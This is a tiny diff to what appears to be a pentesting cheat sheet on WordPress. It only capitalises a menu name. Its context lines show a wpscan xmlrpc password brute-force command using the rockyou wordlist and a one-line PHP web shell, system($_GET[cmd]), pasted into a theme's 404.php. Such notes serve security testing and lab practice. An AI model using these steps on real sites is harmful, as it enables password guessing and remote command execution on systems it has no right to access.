@@ -26,7 +26,7 @@ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rocky
 
 Code Execution:
 
-Edit existing page `appearance -> Theme Editor` - select the appropriate theme, then select a php page e.g. `404.php`. Add this:
+Edit existing page `Appearance -> Theme Editor` - select the appropriate theme, then select a php page e.g. `404.php`. Add this:
 
 ```bash
 system($_GET[cmd]);
